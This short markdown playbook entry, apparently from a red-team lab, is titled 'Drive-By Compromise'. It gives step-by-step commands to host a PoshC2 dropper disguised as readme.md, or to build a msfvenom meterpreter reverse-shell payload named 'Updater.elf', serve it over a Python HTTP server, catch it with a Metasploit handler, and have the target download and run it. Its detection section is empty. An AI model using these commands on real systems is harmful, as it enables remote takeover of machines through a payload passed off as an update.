# Drive-By Compromise

## **Exploit Description:**

Navigating to the hosted payload and run it on the system.

## Command Syntax
```
Host a file in posh or python server in parrot
Posh:
add-hosted-file
/var/poshc2/<project>/payloads/py_dropper.py
/readme.md
/text/html
N

OR make a msfvenom payload and run a python server
cd ~/Downloads
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=200.200.200.<ip> LPORT=53 -f elf > /home/parrot/Downloads/Updater.elf
python3 -m http.server

New tab in terminal:
msfconsole
use exploit/multi/handler
set lhost 200.200.200.<ip>
set lport 53
set payload linux/x86/meterpreter/reverse_tcp
exploit

Open a browser

Navigate to the parrot ip
http://200.200.200.<ip>/<uri or filename>

chmod +x <filename>

./<filename>
```

## Detection Techniques
```

```